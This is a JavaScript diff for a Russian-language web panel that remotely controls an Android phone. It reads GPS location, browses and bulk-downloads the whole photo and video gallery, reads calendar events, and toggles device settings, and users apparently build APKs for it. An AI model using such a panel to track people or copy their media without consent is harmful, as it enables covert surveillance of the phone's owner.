+  phoneSend({ cmd: 'set-bluetooth', enabled: $('#cmdBtToggle').dataset.state !== 'on' });
+};
+$('#cmdTorchToggle').onclick = () => {
+  phoneSend({ cmd: 'set-torch', enabled: $('#cmdTorchToggle').dataset.state !== 'on' });
+};
+
+$('#vibrateMs').addEventListener('input', () => {
+  $('#vibrateMsVal').textContent = $('#vibrateMs').value + ' мс';
+});
+$('#cmdVibrate').onclick = () => phoneSend({ cmd: 'vibrate', ms: parseInt($('#vibrateMs').value) });
+
+const volSliderTimers = {};
+document.querySelectorAll('.vol-slider').forEach((sl) => {
+  sl.addEventListener('input', () => {
+    const stream = sl.dataset.stream;
+    const val = sl.closest('.vol-row')?.querySelector('.vol-val');
+    if (val) val.textContent = `${sl.value}/${sl.max}`;
+    clearTimeout(volSliderTimers[stream]);
+    volSliderTimers[stream] = setTimeout(() => {
+      phoneSend({ cmd: 'set-volume', stream, value: parseInt(sl.value) });
+    }, 250);
+  });
+});
+
+// ---------- Геолокация ----------
+let _leafletMap = null;
+let _locDot = null;
+let _locCircle = null;
+
+$('#cmdGetLocation').onclick = () => {
+  const el = $('#locationCoords');
+  if (el) el.textContent = 'Запрос…';
+  phoneSend({ cmd: 'get-location' });
+};
+
+function renderLocation(m) {
+  const coordsEl = $('#locationCoords');
+  if (m.err) {
+    if (coordsEl) coordsEl.textContent = 'Ошибка: ' + m.err;
+    return;
+  }
+  const acc = m.accuracy ? m.accuracy.toFixed(0) + ' м' : '?';
+  const ago = m.time ? relTime(m.time) : '';
+  if (coordsEl) coordsEl.textContent = `${m.lat.toFixed(6)}, ${m.lon.toFixed(6)} · ±${acc}${ago ? ' · ' + ago : ''}`;
+
+  const ph = $('#locationMapPh');
+  const mapDiv = $('#leafletMap');
+  if (!ph || !mapDiv) return;
+  ph.style.display = 'none';
+  mapDiv.style.display = 'block';
+
+  if (!_leafletMap) {
+    _leafletMap = L.map('leafletMap', { zoomControl: true, attributionControl: false })
+      .setView([m.lat, m.lon], 16);
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+      maxZoom: 19,
+      subdomains: 'abcd'
+    }).addTo(_leafletMap);
+    _locDot = L.circleMarker([m.lat, m.lon], {
+      radius: 9, fillColor: '#3fb950', color: '#fff', weight: 2, fillOpacity: 1
+    }).addTo(_leafletMap);
+    if (m.accuracy) {
+      _locCircle = L.circle([m.lat, m.lon], {
+        radius: m.accuracy, color: '#388bfd', weight: 1, fillOpacity: 0.12
+      }).addTo(_leafletMap);
+    }
+  } else {
+    _leafletMap.setView([m.lat, m.lon], _leafletMap.getZoom());
+    if (_locDot) _locDot.setLatLng([m.lat, m.lon]);
+    if (_locCircle) { _locCircle.remove(); _locCircle = null; }
+    if (m.accuracy) {
+      _locCircle = L.circle([m.lat, m.lon], {
+        radius: m.accuracy, color: '#388bfd', weight: 1, fillOpacity: 0.12
+      }).addTo(_leafletMap);
+    }
+    setTimeout(() => _leafletMap.invalidateSize(), 50);
+  }
+}
+
+// ---------- Галерея ----------
+const _fileDl = new Map(); // requestId → { chunks, name, mime, total, size, startTs, bytesGot }
+let _bulkStats = null;  // из gallery-stats: {imageCount, imageSize, videoCount, videoSize}
+let _bulkState = null;  // активная загрузка: {total, done, totalBytes, bytesDone}
+
+// ---------- Вкладка загрузок ----------
+const _dlHistory = []; // { name, size, took, ts }
+
+function _renderDlTab() {
+  const activeList = $('#dlActiveList');
+  const histCard = $('#dlHistoryCard');
+  const histList = $('#dlHistoryList');
+  const badge = $('#dlBadge');
+
+  const active = [..._fileDl.entries()].filter(([id]) => !id.startsWith('bulk_'));
+  if (badge) {
+    if (active.length > 0) { badge.style.display = ''; badge.textContent = active.length; }
+    else badge.style.display = 'none';
+  }
+
+  if (!activeList) return;
+
+  const spd = _currentSpeedBps();
+  if (active.length === 0) {
+    activeList.innerHTML = '<div class="dl-empty">Нет активных загрузок</div>';
+  } else {
+    activeList.innerHTML = active.map(([, dl]) => {
+      const pct = dl.size > 0 ? Math.round(dl.bytesGot / dl.size * 100)
+        : (dl.chunks && dl.total > 0 ? Math.round(dl.chunks.filter(Boolean).length / dl.total * 100) : 0);
+      const remaining = spd > 0 && dl.size > 0 ? (dl.size - dl.bytesGot) / spd : 0;
+      const gotStr = fmtGB(dl.bytesGot);
+      const totalStr = dl.size ? fmtGB(dl.size) : '?';
+      const meta = [gotStr + ' / ' + totalStr, _fmtSpeed(spd), _fmtEta(remaining)].filter(Boolean).join(' · ');
+      const name = dl.name || 'Загрузка…';
+      return `<div class="dl-item">
+        <div class="dl-name">${name}</div>
+        <div class="dl-bar-wrap"><div class="dl-bar-fill" style="width:${pct}%"></div></div>
+        <div class="dl-meta">${pct}% · ${meta}</div>
+      </div>`;
+    }).join('');
+  }
+
+  if (histCard && histList) {
+    histCard.style.display = _dlHistory.length === 0 ? 'none' : '';
+    if (_dlHistory.length > 0) {
+      histList.innerHTML = _dlHistory.map((h) => {
+        const tookStr = h.took < 60 ? `${h.took} с` : `${Math.round(h.took / 60)} мин`;
+        const time = new Date(h.ts).toLocaleTimeString('ru', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        return `<div class="dl-item dl-done">
+          <div class="dl-name">✓ ${h.name}</div>
+          <div class="dl-meta">${fmtGB(h.size)} · за ${tookStr} · ${time}</div>
+        </div>`;
+      }).join('');
+    }
+  }
+}
+
+setInterval(() => {
+  const tab = $('#tab-files');
+  if (tab && tab.classList.contains('active')) _renderDlTab();
+}, 300);
+
+function _dlRecordDone(dl) {
+  _dlHistory.unshift({ name: dl.name, size: dl.size || dl.bytesGot, took: Math.round((Date.now() - dl.startTs) / 1000), ts: Date.now() });
+  if (_dlHistory.length > 50) _dlHistory.pop();
+}
+
+// Кнопки сворачивания
+let _dlBodyCollapsed = false;
+let _dlHistCollapsed = false;
+
+document.addEventListener('click', (e) => {
+  if (e.target.id === 'dlToggleBtn') {
+    _dlBodyCollapsed = !_dlBodyCollapsed;
+    const body = $('#dlBody');
+    if (body) body.style.display = _dlBodyCollapsed ? 'none' : '';
+    e.target.textContent = _dlBodyCollapsed ? '▼ Развернуть' : '▲ Свернуть';
+  }
+  if (e.target.id === 'dlHistToggleBtn') {
+    _dlHistCollapsed = !_dlHistCollapsed;
+    const list = $('#dlHistoryList');
+    if (list) list.style.display = _dlHistCollapsed ? 'none' : '';
+    e.target.textContent = _dlHistCollapsed ? '▼ Развернуть' : '▲ Свернуть';
+  }
+});
+
+function _handleBinaryChunk(buffer) {
+  try {
+    const view = new DataView(buffer);
+    const headerLen = view.getUint32(0, false);
+    const header = JSON.parse(new TextDecoder().decode(new Uint8Array(buffer, 4, headerLen)));
+    const data = new Uint8Array(buffer, 4 + headerLen);
+    if (header.err) { const dl = _fileDl.get(header.requestId); dl?.onDone?.(); _fileDl.delete(header.requestId); toast('Ошибка: ' + header.err, true); return; }
+    let dl = _fileDl.get(header.requestId);
+    if (!dl) {
+      dl = { chunks: [], name: header.name, mime: header.mime, total: header.total, size: header.size || 0, startTs: Date.now(), bytesGot: 0 };
+      _fileDl.set(header.requestId, dl);
+    } else if (dl.bytesGot === 0) {
+      dl.name = header.name; dl.mime = header.mime; dl.total = header.total; dl.size = header.size || 0;
+    }
+    dl.chunks[header.index] = data;
+    dl.bytesGot += data.byteLength;
+    _trackSpeed(data.byteLength);
+    const got = dl.chunks.filter(Boolean).length;
+    const pct = Math.round(got / dl.total * 100);
+    const spd = _currentSpeedBps();
+    const remaining = spd > 0 && dl.size > 0 ? (dl.size - dl.bytesGot) / spd : 0;
+    const info = [_fmtSpeed(spd), _fmtEta(remaining)].filter(Boolean).join(' · ');
+    toast(`⬇ ${dl.name} — ${pct}%${info ? ' · ' + info : ''}`);
+    if (got === dl.total) {
+      _fileDl.delete(header.requestId);
+      const blob = new Blob(dl.chunks, { type: dl.mime || 'application/octet-stream' });
+      if (header.requestId.startsWith('bulk_')) {
+        if (_bulkState) _bulkState.bytesDone += dl.size || 0;
+        _addToBulkZip(dl.name || 'file', blob);
+      } else {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a'); a.href = url; a.download = dl.name || 'file';
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 2000);
+        toast('✓ Скачан: ' + dl.name);
+        _dlRecordDone(dl);
+      }
+      dl.onDone?.();
+    }
+  } catch (e) { console.error('Binary chunk error', e); toast('Ошибка данных: ' + e.message, true); }
+}
+
+// ZIP-архив для массового скачивания
+const ZIP_PART_MAX = 1024 * 1024 * 1024; // 1 ГБ на часть
+let _bulkZip = null;
+let _bulkZipPart = 0;
+let _bulkZipSize = 0;
+let _bulkZipName = 'gallery';
+
+async function _flushZipAsync() {
+  const zip = _bulkZip;         // захватываем ссылку до сброса
+  const partNum = ++_bulkZipPart;
+  _bulkZip = new JSZip();       // сразу создаём новый — новые файлы идут сюда
+  _bulkZipSize = 0;
+  try {
+    const blob = await zip.generateAsync({ type: 'blob', compression: 'STORE' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `${_bulkZipName}_часть${partNum}.zip`;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    setTimeout(() => URL.revokeObjectURL(a.href), 5000);
+    toast(`✓ Архив часть ${partNum} скачан`);
+  } catch (e) { toast('Ошибка архива: ' + e.message, true); }
+}
+
+function _addToBulkZip(name, blob) {
+  if (!_bulkZip) return;
+  // если добавление превысит лимит — сбрасываем текущую часть
+  if (_bulkZipSize > 0 && _bulkZipSize + blob.size > ZIP_PART_MAX) {
+    _flushZipAsync();
+  }
+  // уникальное имя внутри архива
+  let fname = name || 'file';
+  if (_bulkZip.files[fname]) {
+    const dot = fname.lastIndexOf('.');
+    const base = dot >= 0 ? fname.slice(0, dot) : fname;
+    const ext  = dot >= 0 ? fname.slice(dot) : '';
+    let i = 1;
+    while (_bulkZip.files[`${base}_${i}${ext}`]) i++;
+    fname = `${base}_${i}${ext}`;
+  }
+  _bulkZip.file(fname, blob);
+  _bulkZipSize += blob.size;
+}
+
+// Скользящее окно скорости — храним {ts, bytes} за последние 5 с
+const _speedWindow = [];
+let _lastKnownSpeedBps = 0;
+let _hasRealSpeed = false;
+function _trackSpeed(bytes) {
+  const now = Date.now();
+  _speedWindow.push({ ts: now, bytes });
+  const cutoff = now - 5000;
+  while (_speedWindow.length && _speedWindow[0].ts < cutoff) _speedWindow.shift();
+}
+function _currentSpeedBps() {
+  if (_speedWindow.length < 2) return 0;
+  const span = (_speedWindow[_speedWindow.length - 1].ts - _speedWindow[0].ts) / 1000;
+  if (span <= 0) return 0;
+  const bytes = _speedWindow.slice(1).reduce((s, e) => s + e.bytes, 0);
+  const bps = bytes / span;
+  if (bps > 0) { _lastKnownSpeedBps = bps; _hasRealSpeed = true; }
+  return bps;
+}
+function _speedForEta() {
+  return _hasRealSpeed ? (_currentSpeedBps() || _lastKnownSpeedBps) : 0;
+}
+function _fmtSpeed(bps) {
+  if (bps <= 0) return '';
+  if (bps >= 1024 * 1024) return (bps / 1024 / 1024).toFixed(1) + ' МБ/с';
+  return (bps / 1024).toFixed(0) + ' КБ/с';
+}
+function _fmtEta(seconds) {
+  if (!isFinite(seconds) || seconds <= 0) return '';
+  seconds = Math.round(seconds);
+  if (seconds < 60) return `~${seconds} с`;
+  const m = Math.floor(seconds / 60), s = seconds % 60;
+  if (m < 60) return `~${m} мин ${s} с`;
+  return `~${Math.floor(m / 60)} ч ${m % 60} мин`;
+}
+let _gView = 'none'; // 'none' | 'folders' | 'grid'
+let _gBucketId = '';
+let _gMediaType = 'images';
+let _gFolderName = '';
+let _gOffset = 0;
+let _gTotal = 0;
+let _gLoading = false;
+let _gIntersector = null;
+const G_PAGE = 40;
+
+function loadGalleryFolders() {
+  $('#galleryPlaceholder').style.display = 'none';
+  const fv = $('#galleryFolderView');
+  const gv = $('#galleryGridView');
+  if (fv) { fv.style.display = ''; $('#galleryFolderGrid').innerHTML = '<div class="muted-text" style="padding:12px;text-align:center">Загрузка…</div>'; }
+  if (gv) gv.style.display = 'none';
+  if (_gIntersector) { _gIntersector.disconnect(); _gIntersector = null; }
+  _gView = 'folders';
+  phoneSend({ cmd: 'get-gallery-folders' });
+}
+
+function renderGalleryFolders(m) {
+  const grid = $('#galleryFolderGrid');
+  if (!grid) return;
+  if (m.err) { grid.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
+  const folders = m.folders || [];
+  if (!folders.length) { grid.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Галерея пуста</div>'; return; }
+  grid.innerHTML = folders.map((f) => `
+    <div class="gf-card" data-bucket-id="${f.id}" data-mtype="${f.mediaType}" data-name="${(f.name || '').replace(/"/g, '&quot;')}">
+      <div class="gf-thumb" data-thumb-id="${f.thumbId}" data-mtype="${f.mediaType}">${f.mediaType === 'videos' ? '🎬' : '📷'}</div>
+      <div class="gf-overlay">
+        <div class="gf-name">${f.name || 'Папка'}</div>
+        <div class="gf-count">${f.count}</div>
+      </div>
+    </div>`).join('');
+  grid.querySelectorAll('.gf-card').forEach((card) => {
+    card.onclick = () => openGalleryFolder(card.dataset.bucketId, card.dataset.mtype, card.dataset.name);
+  });
+  grid.querySelectorAll('.gf-thumb[data-thumb-id]').forEach((el) => {
+    const id = parseInt(el.dataset.thumbId);
+    if (id > 0) phoneSend({ cmd: 'get-media-thumb', id, mediaType: el.dataset.mtype });
+  });
+}
+
+function openGalleryFolder(bucketId, mediaType, folderName) {
+  _gBucketId = bucketId;
+  _gMediaType = mediaType;
+  _gFolderName = folderName;
+  _gOffset = 0;
+  _gTotal = 0;
+  _gLoading = false;
+  const grid = $('#galleryGrid');
+  if (grid) grid.innerHTML = '';
+  const title = $('#galleryFolderTitle');
+  if (title) title.textContent = folderName;
+  const info = $('#galleryGridInfo');
+  if (info) info.textContent = '';
+  $('#galleryFolderView').style.display = 'none';
+  $('#galleryGridView').style.display = '';
+  _gView = 'grid';
+  if (_gIntersector) _gIntersector.disconnect();
+  const sentinel = $('#galleryScrollSentinel');
+  if (sentinel) {
+    _gIntersector = new IntersectionObserver((entries) => {
+      if (entries[0].isIntersecting && !_gLoading) loadMoreGallery();
+    }, { rootMargin: '200px' });
+    _gIntersector.observe(sentinel);
+  }
+  loadMoreGallery();
+}
+
+function loadMoreGallery() {
+  if (_gLoading) return;
+  if (_gOffset > 0 && _gOffset >= _gTotal) return;
+  _gLoading = true;
+  phoneSend({ cmd: 'get-gallery', mediaType: _gMediaType, limit: G_PAGE, offset: _gOffset, bucketId: _gBucketId });
+}
+
+function renderGalleryItems(m) {
+  if (m.err) { toast('Галерея: ' + m.err, true); _gLoading = false; return; }
+  const items = m.items || [];
+  _gTotal = m.total || 0;
+  _gOffset = (m.offset || 0) + items.length;
+  _gLoading = false;
+  const info = $('#galleryGridInfo');
+  if (info) info.textContent = `${_gOffset} / ${_gTotal}`;
+  const grid = $('#galleryGrid');
+  if (!grid) return;
+  items.forEach((item) => {
+    const div = document.createElement('div');
+    div.className = 'gp-item';
+    div.innerHTML = `<div class="gp-thumb" data-thumb-id="${item.id}" data-mtype="${m.mediaType}"><div class="gp-icon">${m.mediaType === 'videos' ? '🎬' : '📷'}</div></div><div class="gp-dl-overlay">⬇ Скачать</div>`;
+    div.onclick = async () => {
+      if (div.dataset.downloading) return;
+      div.dataset.downloading = '1';
+      div.style.opacity = '0.5';
+      const unlock = () => { delete div.dataset.downloading; div.style.opacity = ''; };
+      const reqId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+      toast('Подключение…', false, true);
+      try {
+        const resp = await fetch(`/api/dl?id=${item.id}&mediaType=${encodeURIComponent(m.mediaType)}`);
+        if (!resp.ok) {
+          const e = await resp.json().catch(() => ({}));
+          toast('Ошибка: ' + (e.error || resp.statusText), true);
+          unlock(); return;
+        }
+        const total = parseInt(resp.headers.get('content-length') || '0');
+        const disp = resp.headers.get('content-disposition') || '';
+        const fnMatch = disp.match(/filename\*=UTF-8''(.+)/i);
+        const filename = fnMatch ? decodeURIComponent(fnMatch[1]) : (item.displayName || 'file');
+        const mime = resp.headers.get('content-type') || 'application/octet-stream';
+        const dlEntry = { name: filename, size: total, startTs: Date.now(), bytesGot: 0, onDone: unlock };
+        _fileDl.set(reqId, dlEntry);
+        const reader = resp.body.getReader();
+        const parts = [];
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          parts.push(value);
+          dlEntry.bytesGot += value.length;
+          _trackSpeed(value.length);
+          const pct = total ? Math.round(dlEntry.bytesGot / total * 100) : 0;
+          const spd = _currentSpeedBps();
+          const rem = spd > 0 && total > 0 ? (total - dlEntry.bytesGot) / spd : 0;
+          const info = [_fmtSpeed(spd), _fmtEta(rem)].filter(Boolean).join(' · ');
+          toast(`⬇ ${filename} — ${pct}%${info ? ' · ' + info : ''}`, false, true);
+        }
+        _fileDl.delete(reqId);
+        const blob = new Blob(parts, { type: mime });
+        const blobUrl = URL.createObjectURL(blob);
+        const a = document.createElement('a'); a.href = blobUrl; a.download = filename;
+        document.body.appendChild(a); a.click(); document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 2000);
+        toast('✓ Скачан: ' + filename);
+        _dlRecordDone({ name: filename, size: total || dlEntry.bytesGot, startTs: dlEntry.startTs, bytesGot: dlEntry.bytesGot });
+        unlock();
+      } catch (e) {
+        _fileDl.delete(reqId);
+        toast('Ошибка: ' + e.message, true);
+        unlock();
+      }
+    };
+    grid.appendChild(div);
+    phoneSend({ cmd: 'get-media-thumb', id: item.id, mediaType: m.mediaType });
+  });
+}
+
+function fmtGB(bytes) {
+  if (!bytes) return '0 Б';
+  if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(1) + ' ГБ';
+  if (bytes >= 1048576) return (bytes / 1048576).toFixed(0) + ' МБ';
+  return (bytes / 1024).toFixed(0) + ' КБ';
+}
+
+function renderGalleryStats(m) {
+  const el = $('#galleryStats');
+  if (!el) return;
+  if (m.err) { el.textContent = ''; return; }
+  _bulkStats = m;
+  const total = (m.imageSize || 0) + (m.videoSize || 0);
+  const parts = [];
+  if (m.imageCount) parts.push(`${m.imageCount} фото (${fmtGB(m.imageSize)})`);
+  if (m.videoCount) parts.push(`${m.videoCount} видео (${fmtGB(m.videoSize)})`);
+  if (total) parts.push(`Итого: ${fmtGB(total)}`);
+  el.textContent = parts.join(' · ');
+  // Инициализируем ползунки
+  const ps = $('#photoSlider'), vs = $('#videoSlider');
+  if (ps) { ps.max = m.imageCount || 0; if (!+ps.value || +ps.value > +ps.max) ps.value = ps.max; }
+  if (vs) { vs.max = m.videoCount || 0; if (!+vs.value || +vs.value > +vs.max) vs.value = vs.max; }
+  _updateSliderLabels();
+}
+
+function _sliderLabel(count, max, totalSize, totalCount) {
+  if (!max) return '—';
+  const avgSize = totalCount > 0 ? totalSize / totalCount : 0;
+  const sizeEst = count * avgSize;
+  const spd = _speedForEta();
+  const spdStr = _fmtSpeed(spd) + (_hasRealSpeed ? '' : ' прим.');
+  const eta = spd > 0 && sizeEst > 0 ? ' · ~' + _fmtEta(sizeEst / spd) + ' · ' + spdStr : '';
+  const sizeStr = sizeEst > 0 ? ' · ' + fmtGB(sizeEst) : '';
+  const label = count >= max ? `все (${count})` : `${count} из ${max}`;
+  return label + sizeStr + eta;
+}
+
+function _updateSliderLabels() {
+  if (!_bulkStats) return;
+  const ps = $('#photoSlider'), vs = $('#videoSlider');
+  const pl = $('#photoSliderLabel'), vl = $('#videoSliderLabel');
+  if (ps && pl) pl.textContent = _sliderLabel(+ps.value, +ps.max, _bulkStats.imageSize || 0, _bulkStats.imageCount || 0);
+  if (vs && vl) vl.textContent = _sliderLabel(+vs.value, +vs.max, _bulkStats.videoSize || 0, _bulkStats.videoCount || 0);
+}
+
+function _updateBulkProgress() {
+  if (!_bulkState) return;
+  const area = $('#bulkProgressArea');
+  if (!area) return;
+  area.style.display = '';
+  const pct = _bulkState.total > 0 ? Math.round(_bulkState.done / _bulkState.total * 100) : 0;
+  const bar = $('#bulkBar'); if (bar) bar.value = pct;
+  const pt = $('#bulkProgressText');
+  if (pt) pt.textContent = `Файл ${_bulkState.done} / ${_bulkState.total} · ${pct}%`;
+  const spd = _currentSpeedBps();
+  const remaining = spd > 0 && _bulkState.totalBytes > 0 ? (_bulkState.totalBytes - _bulkState.bytesDone) / spd : 0;
+  const et = $('#bulkEtaText');
+  if (et) {
+    const info = [_fmtSpeed(spd), _fmtEta(remaining)].filter(Boolean);
+    et.textContent = info.join(' · ');
+  }
+}
+
+// Обновляем ползунки каждую секунду во время загрузки
+setInterval(() => { if (_bulkState) { _updateBulkProgress(); _updateSliderLabels(); } }, 1000);
+
+function formatBytes(b) {
+  if (!b) return '';
+  if (b < 1024 * 1024) return (b / 1024).toFixed(0) + ' КБ';
+  return (b / 1024 / 1024).toFixed(1) + ' МБ';
+}
+
+function applyMediaThumb(m) {
+  if (!m.data || !m.id) return;
+  document.querySelectorAll(`[data-thumb-id="${m.id}"]`).forEach((el) => {
+    el.innerHTML = `<img src="data:image/jpeg;base64,${m.data}" style="width:100%;height:100%;object-fit:cover;display:block">`;
+  });
+}
+
+$('#cmdLoadGallery').onclick = loadGalleryFolders;
+$('#galleryBack').onclick = () => {
+  if (_gIntersector) { _gIntersector.disconnect(); _gIntersector = null; }
+  _gView = 'folders';
+  $('#galleryGridView').style.display = 'none';
+  $('#galleryFolderView').style.display = '';
+};
+
+$('#photoSlider').addEventListener('input', _updateSliderLabels);
+$('#videoSlider').addEventListener('input', _updateSliderLabels);
+
+$('#dlPhotosBtn').onclick = () => {
+  const limit = parseInt($('#photoSlider').value) || 0;
+  const label = $('#photoSliderLabel')?.textContent || '';
+  if (!confirm(`Скачать фото: ${label}\n\nФайлы упакуются в ZIP-архив. Не закрывай вкладку во время загрузки.`)) return;
+  _bulkZipName = 'photos';
+  phoneSend({ cmd: 'get-bulk-download', mediaType: 'images', photoLimit: limit, videoLimit: 0 });
+  toast('Начинаю загрузку фото…');
+};
+$('#dlVideosBtn').onclick = () => {
+  const limit = parseInt($('#videoSlider').value) || 0;
+  const label = $('#videoSliderLabel')?.textContent || '';
+  if (!confirm(`Скачать видео: ${label}\n\nФайлы упакуются в ZIP-архив. Не закрывай вкладку во время загрузки.`)) return;
+  _bulkZipName = 'videos';
+  phoneSend({ cmd: 'get-bulk-download', mediaType: 'videos', photoLimit: 0, videoLimit: limit });
+  toast('Начинаю загрузку видео…');
+};
+$('#dlAllBtn').onclick = () => {
+  const pl = parseInt($('#photoSlider').value) || 0;
+  const vl = parseInt($('#videoSlider').value) || 0;
+  const lp = $('#photoSliderLabel')?.textContent || '';
+  const lv = $('#videoSliderLabel')?.textContent || '';
+  if (!confirm(`Скачать всё:\nФото — ${lp}\nВидео — ${lv}\n\nФайлы упакуются в ZIP-архив(ы) по 1 ГБ. Не закрывай вкладку.`)) return;
+  _bulkZipName = 'gallery';
+  phoneSend({ cmd: 'get-bulk-download', mediaType: 'all', photoLimit: pl, videoLimit: vl });
+  toast('Начинаю загрузку всего…');
+};
+$('#dlCancelBtn').onclick = () => { phoneSend({ cmd: 'cancel-bulk' }); toast('Отмена…'); };
+
+// ---------- Календарь ----------
+$('#cmdLoadCalendar').onclick = () => {
+  const days = parseInt($('#calDays').value) || 14;
+  const list = $('#calendarList');
+  if (list) list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Загрузка…</div>';
+  phoneSend({ cmd: 'get-calendar', days });
+};
+
+function renderCalendar(m) {
+  const list = $('#calendarList');
+  if (!list) return;
+  if (m.err) { list.innerHTML = `<div class="muted-text" style="padding:10px">${m.err}</div>`; return; }
+  const events = m.events || [];
+  if (!events.length) { list.innerHTML = '<div class="muted-text" style="padding:10px;text-align:center">Нет событий</div>'; return; }
+  list.innerHTML = events.map((e) => {
+    const start = new Date(e.dtstart);
+    const startStr = e.allDay
+      ? start.toLocaleDateString('ru-RU', { day: 'numeric', month: 'long', year: 'numeric' })
+      : start.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
+    let endStr = '';
+    if (e.dtend && !e.allDay) {
+      const end = new Date(e.dtend);
+      const sameDay = start.toDateString() === end.toDateString();
+      endStr = ' — ' + (sameDay
+        ? end.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })
+        : end.toLocaleString('ru-RU', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' }));
+    }
+    return `<div class="cal-event">
+      <div class="cal-time">${startStr}${endStr}</div>
+      <div class="cal-title">${e.title || '(Без названия)'}</div>
+      ${e.location ? `<div class="cal-loc">📍 ${e.location}</div>` : ''}
+      ${e.calendar ? `<div class="cal-cal">${e.calendar}</div>` : ''}
+    </div>`;
+  }).join('');
+}
+
+// ---------- Старт ----------
+fetch('/api/me').then(r => r.json()).then(d => {
+  if (d.admin) {
+    const l = document.getElementById('adminLink');
+    if (l) l.style.display = '';
+    // Admin собирает APK только для себя — поле владельца не показываем
+  } else {
+    // Обычный пользователь: владелец = он сам, поле скрыто
+    const hidden = document.getElementById('bOwnerUserHidden');
+    if (hidden) hidden.value = d.username || '';
+  }
+}).catch(() => {});
+
+loadDashboard();
+showPicker();
